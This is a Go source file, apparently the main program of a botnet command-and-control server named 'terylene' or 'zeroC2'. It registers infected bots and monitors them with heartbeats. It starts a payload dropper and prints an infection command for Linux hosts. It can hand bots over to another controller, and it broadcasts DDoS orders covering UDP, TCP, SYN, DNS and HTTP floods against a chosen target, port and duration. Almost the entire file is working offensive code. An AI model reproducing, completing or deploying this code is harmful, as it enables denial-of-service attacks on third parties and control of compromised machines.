package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	config "terylene/config"
	dropper "terylene/server/components/dropper"
	transfer "terylene/server/components/transfer"
	poly "terylene/server/theme/default"
	"time"

	"github.com/fatih/color"
	zmq "github.com/pebbe/zmq4"
)

type Botstruc struct {
	arch    string
	OS      string
	localip string
}

var (
	//WARNING: changing these values will crash the C2 (unless you know what you're doing !)
	methods     = []string{"UDP", "TCP", "SYN", "DNS", "HTTP", "UDP-VIP"}
	registered  = make(map[string]string)
	tera        = make(map[string]Botstruc)
	aliveclient = make(map[string]time.Time)
)

func broadcaster(message, broadcastmsg string, socket *zmq.Socket) {
	socket.Send(fmt.Sprintf("terylene:%s", message), 0)
	fmt.Println(broadcastmsg)
}

func heartbeatsend(router *zmq.Socket) {
	for {
		for id, _ := range registered {
			router.SendMessage(id, "heartbeat")
		}

		time.Sleep(2 * time.Second)
	}
}
func heartbeatcheck() {
	for {
		for id, last := range aliveclient {
			if time.Since(last) > 5*time.Second {
				delete(aliveclient, id)
				delete(tera, id)
				fmt.Printf("\n\033[1;33mheartbeat monitor: %s has been pronounced dead\033[0m", id)
			}
		}
		time.Sleep(3 * time.Second)
	}
}

func clearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func routerhandle(router *zmq.Socket) {
	for {
		msg, err := router.RecvMessage(0)
		if err != nil {
			continue
		}
		if len(msg) == 0 || len(msg) == 1 {
			return
		}

		//registration
		if len(msg) == 5 {
			if msg[1] == "reg" {
				if _, exists := registered[msg[0]]; exists {
					router.SendMessage(msg[0], "reg")
				} else {
					bot := Botstruc{
						arch:    msg[2],
						OS:      msg[3],
						localip: msg[4],
					}
					tera[msg[0]] = bot
					registered[msg[0]] = "terylene"
					router.SendMessage(msg[0], "terylene", config.Broadcastport)
				}
			}
		}

		if len(msg) == 2 {
			if len(msg) == 2 {
				if msg[1] == "heartbeat" {
					aliveclient[msg[0]] = time.Now()
				} else if msg[1] == "injustice" {
					router.SendMessage(msg[0], "justice")
				} else if msg[1] == "isdone" {
					router.SendMessage(msg[0], "isserved")
				}
			}
		}

	}
}
func getpubIp() string {
	url := "https://api.ipify.org?format=text"
	resp, err := http.Get(url)
	if err != nil {
		return "<your ip>"
	}
	defer resp.Body.Close()
	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "<your ip>"
	}
	return string(ip)
}
func main() {
	title := poly.Title
	help := poly.Help
	methods_list := poly.Methods
	cmdtext := poly.Cmd
	broadcastmsg := poly.Broadcastmsg
	terminalcolor := color.New(color.FgCyan).Add(color.BgHiBlack)

	clearScreen()

	color.Cyan(title)

	time.Sleep(50 * time.Millisecond)

	color.Cyan("[...]starting zeroC2 broadcast server")

	scanner := bufio.NewScanner(os.Stdin)
	publisher, err := zmq.NewSocket(zmq.PUB)
	publisher.SetLinger(0)
	defer publisher.Close()

	if err != nil {
		fmt.Println(err)
		color.Red("[X]error starting zeroC2 broadcast")
		os.Exit(1)
	}

	err = publisher.Bind(fmt.Sprintf("tcp://%s:%s", config.C2ip, config.Broadcastport))

	if err != nil {
		fmt.Println(err)
		color.Red("[X] error binding port %s", config.Broadcastport)
		os.Exit(1)
	}
	time.Sleep(50 * time.Millisecond)
	color.Green("[✔] successfully started zeroC2 broadcast")
	time.Sleep(50 * time.Millisecond)
	color.Cyan("[...]starting zeroC2 router server")

	router, err := zmq.NewSocket(zmq.ROUTER)

	router.SetLinger(0)

	if err != nil {
		color.Red("[X] error creating router socket")
	}
	defer router.Close()

	err = router.Bind(fmt.Sprintf("tcp://%s:%s", config.C2ip, config.Routerport))

	if err != nil {
		fmt.Println(err)
		color.Red("[X] error binding port %s", config.Routerport)
		os.Exit(1)
	}
	go heartbeatsend(router)
	go heartbeatcheck()

	color.Green("[✔] successfully started zeroC2 router")

	color.Cyan("[...]starting zeroC2 dropper")
	go dropper.Dropstart()
	color.Green("[✔] successfully started zeroC2 dropper")
	fmt.Print("press enter to continue...")
	scanner.Scan()

	clearScreen()

	fmt.Println(poly.Welcome)
	go routerhandle(router)
	for {
		terminalcolor.Printf(cmdtext)
		scanner.Scan()

		command := scanner.Text()
		command = strings.TrimSpace(command)
		if scanner.Err() != nil {
			fmt.Println("an error has occured", scanner.Err())
			break
		}

		switch command {
		case "help":
			fmt.Println(help)
			continue
		case "clear":
			clearScreen()
			continue
		case "exit":
			publisher.Close()
			color.Red("[✔] successfully shutdown broadcast")
			router.Close()
			color.Red("[✔] successfully shutdown router")

			os.Exit(1)
		case "methods":
			fmt.Println(methods_list)
		case "list":
			fmt.Println("Number of bots:", len(aliveclient))
			for name, bot := range tera {
				fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\nlocalip: %s\n", name, bot.arch, bot.OS, bot.localip)
			}
		case "payload":
			fmt.Println("linux payload:")
			if config.C2ip == "0.0.0.0" {
				newC2ip := getpubIp()
				fmt.Println(fmt.Sprintf(config.Infcommand, newC2ip))
				continue
			}
			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
		case "transfer":
			if len(aliveclient) == 0 {
				fmt.Println("you dont have any online bots sadly :(")
				continue
			}
			fmt.Printf("target server:")
			scanner.Scan()
			target := strings.TrimSpace(scanner.Text())

			fmt.Printf("router port:")
			scanner.Scan()
			rport := strings.TrimSpace(scanner.Text())

			fmt.Printf("amount of botnets to transfer:")
			scanner.Scan()
			amount := strings.TrimSpace(scanner.Text())

			intamount, err := strconv.Atoi(amount)

			if intamount > len(aliveclient) {
				fmt.Printf("sorry, you only have %d bots", len(aliveclient))
			}
			if err != nil {
				fmt.Println("botnet input is invalid")
				continue
			}
			err = transfer.Transfercheck(target, rport)
			if err != nil {
				fmt.Println("Server check failed, stopped transfer")
			} else {
				fmt.Printf("server check passed, initiating transfer of %d botnets\n", intamount)
				count := 0
				for id, _ := range aliveclient {
					router.SendMessage(id, "migrate", target, rport)
					delete(aliveclient, id)
					delete(tera, id)
					if count == intamount {
						break
					}
				}
				fmt.Println("operation successful!!!")
			}
		}
		if strings.Contains(command, "!") {
			containsBlocked := false
			for _, value := range methods {
				if strings.Contains(command, value) {
					for _, block := range config.Blocked {
						if strings.Contains(command, block) {
							containsBlocked = true
						}
					}
					if containsBlocked {
						break
					}
					parts := strings.Fields(command)
					if len(parts) == 4 {
						_, err := strconv.Atoi(parts[2])
						if err != nil {
							continue
						}
						_, err = strconv.Atoi(parts[3])
						if err != nil {
							continue
						}
						clearScreen()
						broadcaster(command, broadcastmsg, publisher)
					} else {
						fmt.Println("format: !<method> <target> <port> <duration>")
					}
					break
				}
			}
		}

	}
}
